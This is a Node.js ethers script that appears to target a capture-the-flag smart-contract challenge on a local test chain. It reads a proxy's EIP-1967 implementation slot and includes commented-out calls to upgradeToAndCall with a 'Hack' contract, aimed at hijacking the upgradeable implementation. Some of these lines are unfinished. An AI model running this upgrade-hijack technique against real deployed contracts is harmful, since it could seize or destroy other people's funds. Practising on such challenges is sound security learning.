const fs = require('fs');
const { ethers, keccak256, toBeHex, zeroPad, BigNumber, zeroPadValue, getBytes, Interface } = require('ethers');
const { argv } = require('node:process');
const { Contract } = require('ethers');
const { ChainstackProvider } = require('ethers');

const provider = new ethers.JsonRpcProvider('http://localhost:8545');
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';

const wallet = new ethers.Wallet(privateKey, provider);

const abi = JSON.parse(fs.readFileSync('build/Hack.abi', 'utf8'));


const abi_chall = [
  "constructor(address)",
  "fallback() external payable",
  "function upgradeToAndCall(address newImplementation, bytes data) external payable",
  "function initialize() external",
  "function upgrader() view returns (address)",
  "function horsePower() view returns (uint256)",
];


const abi_proxy = [
  "function initialize() external",
  "function upgradeToAndCall(address newImplementation, bytes data) external payable",
  "function upgrader() view returns (address)",
  "function horsePower() view returns (uint256)",
  "function hack() public",
];


async function main() {
  const addr_chall = "0x12300cc4b778feF85Db771525D76562515882953";
  const addr_hack = "0xB82008565FdC7e44609fA118A4a681E92581e680";
  let addr_proxy =  await provider.getStorage(addr_chall,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");;
  console.log(addr_proxy);
  addr_proxy = "0x62975df1f0510a14480b8d0b1c2ee5f868f3f068";

  const contra_chall = new ethers.Contract(addr_chall,abi_chall,wallet);
  const contra_proxy = new ethers.Contract(addr_proxy,abi_proxy,wallet);
  const contra_hack = new ethers.Contract(addr_hack,abi,wallet);
  


  console.log(await contra_chall.upgrader())
  console.log(await contra_chall.horsePower())


  console.log(await contra_proxy.upgrader())
  console.log(await contra_proxy.horsePower())

  
  // await (await contra_chall.delegatecall(addr_hack,"0x")).wait();

  
  // contra_hack.on("Log", (msg,succ) => {
  //   console.log("Log:", msg);
  // });

  // await (await contra_chall.upgradeToAndCall(addr_hack,"0x")).wait();
  
  // const interface = new Interface([
  //   "function hack() public",
  // ])
  // await (await contra_chall.upgradeToAndCall(addr_hack,interface.getA)).wait();
  // await (await contra_proxy.hack()).wait()


  addr_new =  await provider.getStorage(addr_chall,0);
  console.log(addr_new);
}

main();




